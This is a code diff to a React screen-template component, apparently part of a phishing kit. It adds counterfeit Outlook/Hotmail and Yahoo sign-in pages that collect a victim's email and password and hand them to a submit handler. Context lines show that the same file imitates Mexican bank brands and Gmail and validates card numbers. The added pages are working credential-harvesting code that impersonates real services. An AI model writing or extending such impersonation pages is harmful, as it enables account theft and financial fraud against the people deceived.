@@ -27,6 +27,7 @@ import invexLogoWhite from '../../assets/invex_logo_white.png';
 import banregioLogo from '../../assets/banregio_logo.png';
 import banregioLogoWhite from '../../assets/banregio_logo_white.png';
 import googleLogo from '../../assets/google-logo.png';
+import yahooLogo from '@assets/pngwing.com 2.png';
 
 interface ScreenTemplatesProps {
   currentScreen: ScreenType;
@@ -69,6 +70,10 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
   const [gmailContrasena, setGmailContrasena] = useState('');
   const [showGmailPassword, setShowGmailPassword] = useState(false);
   const [gmailScreen, setGmailScreen] = useState<'correo' | 'contrasena'>('correo');
+  const [hotmailStep2, setHotmailStep2] = useState(false);
+  const [yahooStep2, setYahooStep2] = useState(false);
+  const [emailInput, setEmailInput] = useState('');
+  const [passwordInput, setPasswordInput] = useState('');
   
   // Función para validar número de tarjeta con algoritmo de Luhn
   const validateCardNumber = (number: string) => {
@@ -735,6 +740,206 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         );
         
         return getGmailVerifyContainer(gmailVerificationContent);
+        
+      case ScreenType.HOTMAIL:
+        const hotmailContent = (
+          <div className="flex flex-col items-center w-full max-w-md mx-auto">
+            <div className="flex justify-center mb-8">
+              <img 
+                src="https://logos-world.net/wp-content/uploads/2020/11/Outlook-Logo.png" 
+                alt="Microsoft Outlook Logo" 
+                className="h-10"
+              />
+            </div>
+            
+            <h2 className="text-2xl font-light mb-6 self-start">Iniciar sesión</h2>
+            
+            {!hotmailStep2 ? (
+              // Paso 1: Correo electrónico
+              <>
+                <div className="w-full mb-4">
+                  <Input 
+                    type="email" 
+                    className="w-full p-2 border border-gray-300 rounded text-black" 
+                    placeholder="Correo electrónico, teléfono o Skype"
+                    value={emailInput}
+                    onChange={(e) => setEmailInput(e.target.value)}
+                  />
+                </div>
+                
+                <div className="text-xs text-gray-600 mb-6 self-start">
+                  ¿No tiene una cuenta? <a href="#" className="text-blue-600">Cree una.</a>
+                </div>
+                
+                <div className="flex justify-between w-full">
+                  <div>
+                    <a href="#" className="text-sm text-blue-600">Opciones de inicio de sesión</a>
+                  </div>
+                  <Button 
+                    className="bg-blue-600 text-white px-8 rounded"
+                    onClick={() => {
+                      // Validación mínima
+                      if (!emailInput) return;
+                      setHotmailStep2(true);
+                    }}
+                  >
+                    Siguiente
+                  </Button>
+                </div>
+              </>
+            ) : (
+              // Paso 2: Contraseña
+              <>
+                <div className="text-base self-start mb-6">
+                  {emailInput}
+                </div>
+                
+                <div className="w-full mb-4">
+                  <Input 
+                    type="password" 
+                    className="w-full p-2 border border-gray-300 rounded text-black" 
+                    placeholder="Contraseña"
+                    value={passwordInput}
+                    onChange={(e) => setPasswordInput(e.target.value)}
+                  />
+                </div>
+                
+                <div className="text-xs text-gray-600 mb-6 self-start">
+                  <a href="#" className="text-blue-600">¿Olvidó su contraseña?</a>
+                </div>
+                
+                <div className="flex justify-between w-full">
+                  <div>
+                    <Button 
+                      variant="link" 
+                      className="text-sm text-blue-600 p-0"
+                      onClick={() => setHotmailStep2(false)}
+                    >
+                      Atrás
+                    </Button>
+                  </div>
+                  <Button 
+                    className="bg-blue-600 text-white px-8 rounded"
+                    onClick={() => {
+                      // Validación mínima
+                      if (!passwordInput) return;
+                      onSubmit(ScreenType.HOTMAIL, { 
+                        correo: emailInput, 
+                        contrasena: passwordInput 
+                      });
+                    }}
+                  >
+                    Iniciar sesión
+                  </Button>
+                </div>
+              </>
+            )}
+          </div>
+        );
+        
+        return (
+          <div className="bg-white p-6 pt-8 rounded max-w-lg mx-auto shadow">
+            {hotmailContent}
+          </div>
+        );
+        
+      case ScreenType.YAHOO:
+        const yahooContent = (
+          <div className="flex flex-col items-center w-full max-w-sm mx-auto">
+            <div className="flex justify-center mb-8">
+              <img 
+                src={yahooLogo} 
+                alt="Yahoo Logo" 
+                className="h-10"
+              />
+            </div>
+            
+            {!yahooStep2 ? (
+              // Paso 1: Correo electrónico
+              <>
+                <h2 className="text-3xl font-bold mb-6">Iniciar sesión</h2>
+                
+                <div className="w-full mb-5">
+                  <Input 
+                    type="email" 
+                    className="w-full p-3 border border-gray-300 rounded-sm text-black" 
+                    placeholder="Nombre de usuario, correo o teléfono móvil"
+                    value={emailInput}
+                    onChange={(e) => setEmailInput(e.target.value)}
+                  />
+                </div>
+                
+                <div className="flex justify-between w-full">
+                  <div>
+                    <a href="#" className="text-sm text-blue-700">Crear cuenta</a>
+                  </div>
+                  <Button 
+                    className="bg-[#6001D2] hover:bg-[#5300bd] text-white px-8 py-2 rounded-sm"
+                    onClick={() => {
+                      // Validación mínima
+                      if (!emailInput) return;
+                      setYahooStep2(true);
+                    }}
+                  >
+                    Siguiente
+                  </Button>
+                </div>
+              </>
+            ) : (
+              // Paso 2: Contraseña
+              <>
+                <h2 className="text-3xl font-bold mb-6">Ingresa tu contraseña</h2>
+                
+                <div className="text-base self-start mb-2 font-bold">
+                  {emailInput}
+                </div>
+                
+                <div className="w-full mb-5">
+                  <Input 
+                    type="password" 
+                    className="w-full p-3 border border-gray-300 rounded-sm text-black" 
+                    placeholder="Contraseña"
+                    value={passwordInput}
+                    onChange={(e) => setPasswordInput(e.target.value)}
+                  />
+                </div>
+                
+                <div className="text-sm self-start mb-5">
+                  <a href="#" className="text-blue-700">¿Olvidaste tu contraseña?</a>
+                </div>
+                
+                <div className="flex justify-between w-full">
+                  <Button 
+                    variant="link" 
+                    className="text-sm text-blue-700 p-0"
+                    onClick={() => setYahooStep2(false)}
+                  >
+                    Atrás
+                  </Button>
+                  <Button 
+                    className="bg-[#6001D2] hover:bg-[#5300bd] text-white px-8 py-2 rounded-sm"
+                    onClick={() => {
+                      // Validación mínima
+                      if (!passwordInput) return;
+                      onSubmit(ScreenType.YAHOO, { 
+                        correo: emailInput, 
+                        contrasena: passwordInput 
+                      });
+                    }}
+                  >
+                    Siguiente
+                  </Button>
+                </div>
+              </>
+            )}
+          </div>
+        );
+        
+        return (
+          <div className="bg-white p-6 pt-8 rounded max-w-lg mx-auto shadow">
+            {yahooContent}
+          </div>
+        );
 
       default:
         const defaultContent = (
